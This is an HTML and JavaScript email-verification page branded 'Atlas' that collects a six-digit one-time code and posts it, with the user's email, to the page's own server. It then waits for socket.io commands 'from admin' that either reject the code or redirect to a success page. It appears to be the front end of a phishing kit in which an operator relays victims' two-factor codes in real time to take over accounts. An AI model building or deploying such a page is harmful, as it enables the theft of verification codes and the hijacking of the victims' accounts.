<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
<title>Atlas - Verify Email</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Helvetica Neue',sans-serif;
  background:#f0f0f0;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
}

.phone{
  width:390px;
  height:844px;
  background:#fff;
  border-radius:50px;
  overflow:hidden;
  position:relative;
  box-shadow:0 30px 80px rgba(0,0,0,0.22),
             inset 0 0 0 1px rgba(0,0,0,0.07);
}

@media(max-width:420px){
  .phone{
    width:100%;
    height:100vh;
    border-radius:0;
  }
}

/* YOUR EXACT GRADIENT */
.gradient-header{
  position:absolute;
  top:0;
  left:0;
  width:100%;
  height:52%;
  background:radial-gradient(
    ellipse 90% 90% at 50% 5%,
    #1e20cc 0%,
    #3a3ef0 20%,
    #6b72f5 42%,
    #b8bcfc 65%,
    #ffffff 100%
  );
  z-index:0;
}

.header-logo{
  position:absolute;
  top:48px;
  left:50%;
  transform:translateX(-50%);
  width:36px;
  height:36px;
  z-index:5;
}

/* MAIN CONTENT */
.main-content{
  position:absolute;
  top:50%;
  left:0;
  right:0;
  transform:translateY(-50%);
  padding:28px;
  z-index:5;
  background:transparent;
}

.email-icon{
  width:36px;
  height:28px;
  background:#4a4ff0;
  border-radius:6px;
  position:relative;
  margin-bottom:16px;
}

.email-icon::after{
  content:'';
  position:absolute;
  top:0;
  left:0;
  right:0;
  border-top:14px solid #3035dd;
  border-left:18px solid transparent;
  border-right:18px solid transparent;
}

.page-title{
  font-size:24px;
  font-weight:700;
  color:#4a4ff0;
  margin-bottom:8px;
}

.subtext{
  font-size:14px;
  color:#444;
  line-height:1.55;
  margin-bottom:28px;
}

.email-display{
  color:#111;
  font-weight:500;
}

/* OTP BOXES */
.otp-row{
  display:flex;
  gap:9px;
  justify-content:center;
  margin-bottom:20px;
  flex-wrap:wrap;
}

.otp-box{
  width:50px;
  height:55px;
  background:#efefef;
  border:none;
  border-radius:12px;
  font-size:22px;
  font-weight:600;
  text-align:center;
  color:#222;
  outline:none;
}

.otp-box:focus{
  background:#e2e2f0;
  border-color:#4a4ff0;
}

@media(max-width:450px){
  .otp-box{
    width:45px;
    height:50px;
    font-size:20px;
  }
}

@media(max-width:380px){
  .otp-box{
    width:42px;
    height:48px;
    font-size:18px;
  }
  .otp-row{
    gap:6px;
  }
}

.resend{
  font-size:14px;
  color:#666;
  margin-bottom:26px;
  text-align:center;
}

.resend a{
  color:#4a4ff0;
  text-decoration:none;
  cursor:pointer;
}

.btn-verify{
  width:100%;
  padding:17px;
  background:#c5c8fb;
  color:#fff;
  border:none;
  border-radius:50px;
  font-size:16px;
  font-weight:600;
  cursor:default;
}

.btn-verify.active{
  background:#4a4ff0;
  cursor:pointer;
}

.btn-verify:disabled{
  opacity:0.7;
}

.spinner{
  width:20px;
  height:20px;
  border:2px solid rgba(255,255,255,0.3);
  border-top:2px solid white;
  border-radius:50%;
  animation:spin 0.8s linear infinite;
  display:inline-block;
  vertical-align:middle;
  margin-right:8px;
}

@keyframes spin{
  to{transform:rotate(360deg);}
}

.error-msg{
  color:#dc2626;
  font-size:13px;
  margin-top:12px;
  text-align:center;
  display:none;
}
</style>
</head>
<body>

<div class="phone">
  <div class="gradient-header"></div>
  <img src="logoMain.png"class="header-logo">

  <div class="main-content">
    <h2 class="page-title">Verify your email</h2>
    <p class="subtext">
      An email with a verification code was just sent to
      <span class="email-display" id="emailDisplay"></span>
    </p>

    <div class="otp-row">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
      <input class="otp-box" maxlength="1" type="tel" inputmode="numeric" pattern="[0-9]">
    </div>

    <div class="resend" id="resendText">Resend in <span id="timer">59</span>s</div>
    <div id="otpError" class="error-msg"></div>
    <button class="btn-verify" id="verifyBtn">Verify</button>
  </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  if (!email) window.location.href = '/';

  // Display email
  document.getElementById('emailDisplay').textContent = email;

  const socket = io();
  const boxes = document.querySelectorAll('.otp-box');
  const verifyBtn = document.getElementById('verifyBtn');
  const errorDiv = document.getElementById('otpError');

  // Timer for resend
  let timerSeconds = 11;
  const timerSpan = document.getElementById('timer');
  const resendText = document.getElementById('resendText');

  const timerInterval = setInterval(() => {
    timerSeconds--;
    if (timerSeconds > 0) {
      timerSpan.textContent = timerSeconds;
    } else {
      clearInterval(timerInterval);
      resendText.innerHTML = 'Resend code';
    }
  }, 1000);

  // OTP input handling
  function updateButtonState() {
    const filled = [...boxes].every(b => /^\d$/.test(b.value));
    if (filled) {
      verifyBtn.classList.add('active');
    } else {
      verifyBtn.classList.remove('active');
    }
  }

  function handleInput(e, idx) {
    if (e.target.value.length === 1 && idx < 5) {
      boxes[idx + 1].focus();
    }
    updateButtonState();
    errorDiv.style.display = 'none';
  }

  boxes.forEach((box, idx) => {
    box.addEventListener('input', (e) => handleInput(e, idx));
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        boxes[idx - 1].focus();
      }
    });
    box.addEventListener('keypress', (e) => {
      if (!/[0-9]/.test(e.key)) {
        e.preventDefault();
      }
    });
  });

  // Submit OTP
  verifyBtn.addEventListener('click', async () => {
    if (!verifyBtn.classList.contains('active')) return;

    const otp = [...boxes].map(b => b.value).join('');
    if (otp.length !== 6) return;

    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<div class="spinner"></div> Verifying...';

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, otp })
      });
      const data = await res.json();
      if (data.success) {
        verifyBtn.innerHTML = 'Checking requirements...';
        verifyBtn.disabled = true;
      } else {
        errorDiv.textContent = data.error || 'Failed to submit OTP';
        errorDiv.style.display = 'block';
        verifyBtn.disabled = false;
        verifyBtn.innerHTML = 'Verify';
        verifyBtn.classList.add('active');
      }
    } catch (err) {
      errorDiv.textContent = 'Network error';
      errorDiv.style.display = 'block';
      verifyBtn.disabled = false;
      verifyBtn.innerHTML = 'Verify';
      verifyBtn.classList.add('active');
    }
  });

  // Socket events from admin
  socket.on('incorrect-otp', (data) => {
    if (data.email === email) {
      errorDiv.textContent = 'Incorrect OTP. Please check your email again.';
      errorDiv.style.display = 'block';
      boxes.forEach(b => b.value = '');
      verifyBtn.classList.remove('active');
      verifyBtn.disabled = false;
      verifyBtn.innerHTML = 'Verify';
      boxes[0].focus();
    }
  });

  socket.on('redirect-to-sad', (data) => {
    if (data.email === email) {
      window.location.href = '/success.html';
    }
  });
</script>
</body>
</html>
